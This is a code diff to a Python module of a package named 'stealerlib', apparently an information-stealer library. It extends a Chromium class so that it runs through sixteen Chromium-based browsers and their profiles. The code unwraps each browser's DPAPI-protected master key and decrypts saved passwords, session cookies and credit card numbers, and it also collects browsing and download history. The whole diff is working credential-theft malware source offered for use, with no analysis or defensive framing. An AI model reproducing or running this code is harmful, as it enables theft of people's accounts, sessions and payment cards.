@@ -9,70 +9,103 @@ from stealerlib.browser import *
 
 
 class Chromium:
-    """This class provides methods for extracting and decrypting cookies and passwords from Chromium based Web Browser databases
+    """This class provides methods for extracting and decrypting information from Chromium based Web Browser databases
 
     Attributes:
-        cookies         A list of (host, cookie_name, cookie_value, created, last_accessed, expires) tuples for each saved cookie
-        passwords       A list of (username, password, url, created, last_used) tuples for each saved password
+        appdate     The local filepath for the APPDATA folder
+        browsers    A dictionary containing the name and local file path for each popular browser 
+        profiles    A list containing the default Chrome Profile names
 
-        opera_path      Path to Opera (GX)'s base directory
-        chrome_path     Path to Google Chrome's base directory
-
-        key             Encryption key to be used when handling encrypted values in the browsers database
+        chromium_passwords  A list of (site_url, username, password) lists for each saved password
+        chromium_downloads  A list of (tab_url, local_path) lists for each saved download
+        chromium_cookies    A list of (site_url, title, timestamp) lists for each saved cookie
+        chromium_history    A list of (host, name, path, value, expires?, expire_date) lists for each site in the saved history
+        chromium_banking    A list of (name, month, year, number, date_modified) lists for each saved bank card
     """
 
-    def __init__(self):
-        self.cookies = []
-        self.passwords = []
+    def __init__(self): 
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.browsers = {
+            'amigo': self.appdata + '\\Amigo\\User Data',
+            'torch': self.appdata + '\\Torch\\User Data',
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+        }
+        self.profiles = [
+            'Default',
+            'Profile 1',
+            'Profile 2',
+            'Profile 3',
+            'Profile 4',
+            'Profile 5',
+        ]
 
-        self.opera_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
-        self.opera_installed = os.path.exists(self.opera_path)
+        self.chromium_passwords = []
+        self.chromium_downloads = []
+        self.chromium_cookies = []
+        self.chromium_history = []
+        self.chromium_banking = []
 
-        self.chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-        self.chrome_installed = os.path.exists(self.chrome_path)
+    def cget(self, func: callable) -> list:
+        temp_data = []
 
-    @staticmethod
-    def get_datetime(time_ms: int) -> Union[str, int]:
-        """Return a formatted `datetime.datetime` object from a chrome format datetime (in ms)
+        for _, path in self.browsers.items():
+            if not os.path.exists(path):
+                continue
 
-        Parameters:
-            time_ms (int): The amount of milliseconds we need to convert to a datetime object
+            self.master_key = self.get_encryption_key(f'{path}\\Local State')
+            if not self.master_key:
+                continue
 
-        Returns:
-            Union[datetime, int]: returns time_ms or the datetime object formatted using strftime
-        """
+            for profile in self.profiles:
+                if not os.path.exists(path + '\\' + profile):
+                    continue
 
-        if time_ms != 86400000000 and time_ms:
-            try:
-                dt = datetime(1601, 1, 1) + timedelta(microseconds=time_ms)
-                return dt.strftime("%m/%d/%Y, %H:%M:%S")
-            except:
-                return time_ms
-        else:
-            return ""
+                data = func(path, profile)
+                temp_data.append(data)
 
-    @catch
+        return temp_data
+
     def get_encryption_key(self, path: str) -> bytes:
         """Retrieves the master encryption key used to encrypt the user's data
 
         Parameters:
             self (object): The object passed to the method
+            path (str): The browser path to get the encryption key from
 
         Returns:
             bytes: The encryption key we'll use to decrypt the user's passwords
         """
 
+        if not os.path.exists(path):
+            return
+
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
         with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
             local_state = json.loads(local_state)
 
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        key = key[5:]
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        return master_key
 
-    @catch
-    def decrypt_password(self, password: str) -> str:
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         """Decrypts an encrypted password using the given encryption key
 
         Parameters:
@@ -84,123 +117,203 @@ class Chromium:
             str: The decrypted password
         """
 
-        try:
-            vector = password[3:15]
-            password = password[15:]
-            cipher = AES.new(self.key, AES.MODE_GCM, vector)
+        vector = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, vector)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
 
-            return cipher.decrypt(password)[:-16].decode()
-        except:
-            try:
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-            except:
-                return ""
+        return decrypted_pass
 
-    @catch
-    def get_passwords_chromium(self) -> list[tuple[str, ...]]:
-        """Retrieves the username and password from the Chrome browser by connecting to the Chrome database file -
+    def _chromium_passwords(self, path: str, profile: str) -> list:
+        """Retrieves the site url, username and password from the passed Chromium browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
         Parameters:
             self (object): The object passed to the method
+            path (str): Chromium browser path to get the passwords from
+            profile (str): Chrome profile to use (if available)
 
         Returns:
-            list[tuple[str, ...]]: list of (username, password, url, created, last_used) tuples 
+            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 
 
         Example:
-            browser = Browser()
-            browser.get_passwords_chromium()
+            chromium = Chromium()
+            chromium._chromium_passwords()
         """
 
-        if not self.chrome_installed:
-            return self.passwords.append([])
+        login_db = f'{path}\\{profile}\\Login Data'
+        if not os.path.exists(login_db):
+            return
 
-        select_query = """
-        SELECT origin_url, username_value, password_value, date_created, date_last_used
-        FROM logins order by date_created"""
+        shutil.copy(login_db, 'login_db')
+        conn = sqlite3.connect('login_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            self.key = self.get_encryption_key(self.chrome_path)
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
 
-            chrome_temp_db = "{}\ChromeData.db".format(tmpdir)
-            shutil.copyfile(self.chrome_path, chrome_temp_db)
+            password = self.decrypt_password(row[2], self.master_key)
+            login = DataTypes.Login(row[0], row[1], password)
+            self.chromium_passwords.append(login.conv())
 
-            db = sqlite3.connect(chrome_temp_db)
-            cursor = db.cursor()
-            cursor.execute(select_query)
+        conn.close()
+        os.remove('login_db')
 
-            for row in cursor.fetchall():
-                origin_url, username, encrypted_password, date_created, date_last_used = row
+        return self.chromium_passwords
 
-                password = self.decrypt_password(encrypted_password)
-                date_created = self.get_datetime(date_created)
-                date_last_used = self.get_datetime(date_last_used)
-
-                if username or password:
-                    self.passwords.append((username, password, origin_url, date_created, date_last_used))
-                else:
-                    continue
-
-            cursor.close()
-            db.close()
-            os.remove(chrome_temp_db)
-
-        return self.passwords
-
-    @catch
-    def get_passwords_opera(self) -> list[tuple[str, ...]]:
-        """Retrieves the username and password from the Chrome browser by connecting to the Chrome database file -
-           and decrypting the passwords using the encryption key
+    def _chromium_cookies(self, path: str, profile: str):
+        """Retrieves the site host, cookie name, value and various other information from the passed Chromium browser -
+           by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
         Parameters:
             self (object): The object passed to the method
+            path (str): Chromium browser path to get the cookie information from
+            profile (str): Chrome profile to use (if available)
 
         Returns:
-            list[tuple[str, ...]]: list of (username, password, url, created, last_used) tuples 
+            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from DataTypes conv()) 
 
         Example:
-            browser = Browser()
-            browser.get_passwords_opera()
+            chromium = Chromium()
+            chromium._chromium_cookies()
         """
 
-        if not self.opera_installed:
-            return self.passwords.append([])
+        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+        if not os.path.exists(cookie_db):
+            return
 
-        select_query = """
-        SELECT origin_url, username_value, password_value, date_created, date_last_used
-        FROM logins order by date_created"""
+        shutil.copy(cookie_db, 'cookie_db')
+        conn = sqlite3.connect('cookie_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            self.key = self.get_encryption_key(self.opera_path)
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
 
-            opera_temp_db = "{}\OperaData.db".format(tmpdir)
-            shutil.copyfile(self.opera_path, opera_temp_db)
+            value = self.decrypt_password(row[3], self.master_key)
+            cookie = DataTypes.Cookie(row[0], row[1], row[2], value, row[4])
+            self.chromium_cookies.append(cookie.conv())
 
-            db = sqlite3.connect(opera_temp_db)
-            cursor = db.cursor()
-            cursor.execute(select_query)
+        conn.close()
+        os.remove('cookie_db')
 
-            for row in cursor.fetchall():
-                origin_url, username, encrypted_password, date_created, date_last_used = row
+        return self.chromium_cookies
 
-                password = self.decrypt_password(encrypted_password)
-                date_created = self.get_datetime(date_created)
-                date_last_used = self.get_datetime(date_last_used)
+    def _chromium_history(self, path: str, profile: str) -> list:
+        """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Chromium browser -
+           by connecting to its database file and parsing the needed data
 
-                if username or password:
-                    self.passwords.append((username, password, origin_url, date_created, date_last_used))
-                else:
-                    continue
+        Parameters:
+            self (object): The object passed to the method
+            path (str): Chromium browser path to get the web history from
+            profile (str): Chrome profile to use (if available)
 
-            cursor.close()
-            db.close()
-            os.remove(opera_temp_db)
+        Returns:
+            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 
 
-        return self.passwords
+        Example:
+            chromium = Chromium()
+            chromium._chromium_history()
+        """
 
+        web_history_db = f'{path}\\{profile}\\History'
+        if not os.path.exists(web_history_db):
+            return
 
-if __name__ == '__main__':
-    browser = Chromium()
-    browser.get_passwords_chromium()
-    browser.get_passwords_opera()
-    print(browser.passwords)
+        shutil.copy(web_history_db, 'web_history_db')
+        conn = sqlite3.connect('web_history_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
+
+            site = DataTypes.Site(row[0], row[1], row[2])
+            self.chromium_history.append(site.conv())
+
+        conn.close()
+        os.remove('web_history_db')
+
+        return self.chromium_history
+
+    def _chromium_downloads(self, path: str, profile: str) -> list:
+        """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Chromium browser -
+           by connecting to its database file and parsing the needed data
+
+        Parameters:
+            self (object): The object passed to the method
+            path (str): Chromium browser path to get the download history from
+            profile (str): Chrome profile to use (if available)
+
+        Returns:
+            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 
+
+        Example:
+            chromium = Chromium()
+            chromium._chromium_downloads()
+        """
+
+        downloads_db = f'{path}\\{profile}\\History'
+        if not os.path.exists(downloads_db):
+            return
+
+        shutil.copy(downloads_db, 'downloads_db')
+        conn = sqlite3.connect('downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+
+            download = DataTypes.Download(row[0], row[1])
+            self.chromium_downloads.append(download.conv())
+
+        conn.close()
+        os.remove('downloads_db')
+
+        return self.chromium_downloads
+
+    def _chromium_credit_cards(self, path: str, profile: str) -> list:
+        """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Chromium browser -
+           by connecting to its database file and parsing the needed data
+
+        Parameters:
+            self (object): The object passed to the method
+            path (str): Chromium browser path to get the bank cards from from
+            profile (str): Chrome profile to use (if available)
+
+        Returns:
+            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 
+
+        Example:
+            chromium = Chromium()
+            chromium._chromium_credit_cards()
+        """
+
+        cards_db = f'{path}\\{profile}\\Web Data'
+        if not os.path.exists(cards_db):
+            return
+
+        shutil.copy(cards_db, 'cards_db')
+        conn = sqlite3.connect('cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+
+            card_number = self.decrypt_password(row[3], self.master_key)
+            card = DataTypes.Card(row[0], row[1], row[2], card_number, row[4])
+            self.chromium_banking.append(card.conv())
+
+        conn.close()
+        os.remove('cards_db')
+
+        return self.chromium_banking
